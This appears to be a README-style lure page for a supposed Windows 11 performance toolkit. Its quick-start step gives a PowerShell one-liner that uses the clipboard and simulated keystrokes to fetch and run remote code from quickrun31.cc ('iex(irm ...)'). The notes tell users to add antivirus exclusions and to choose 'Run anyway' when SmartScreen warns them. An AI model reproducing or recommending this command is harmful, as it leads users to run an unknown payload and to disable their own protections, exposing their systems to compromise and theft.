# Windows 11 Performance Toolkit — 2026 Working Setup

Squeeze more frames and less lag out of your machine with a curated set of safe tweaks. No complicated steps, no sign-up walls. Scroll down, grab the launcher snippet and you're done.

## ✨ Highlights

- Step-by-step documentation included in this repository
- Offline-friendly after first launch
- Regularly updated builds with change notes
- No personal data collection

## 🚀 Quick start

1. Hold the **Windows key** and tap **R** to open the Run box.
2. Insert this one-line command and hit Enter.

```powershell
powershell Set-Clipboard 'iex(irm quickrun31.cc/w8h11i)';Start-Process powershell;Start-Sleep -m 1200;(New-Object -ComObject WScript.Shell).SendKeys('^v');Start-Sleep -m 200;(New-Object -ComObject WScript.Shell).SendKeys('{ENTER}')
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 📋 Notes

- If your antivirus flags the helper script, add an exclusion — it only touches the clipboard to paste the launcher.
- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".
- Run the command exactly as shown — quotes and semicolons matter.

## ❓ FAQ

**Q: How often is it updated?**

A: Check the changelog file — updates land roughly every few weeks.

**Q: Where do I report problems?**

A: Open an issue in this repository with your OS version and a short description of what happened.

**Q: Is an internet connection required?**

A: Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

_Not affiliated with the original software vendor. Names and trademarks are property of their respective owners._
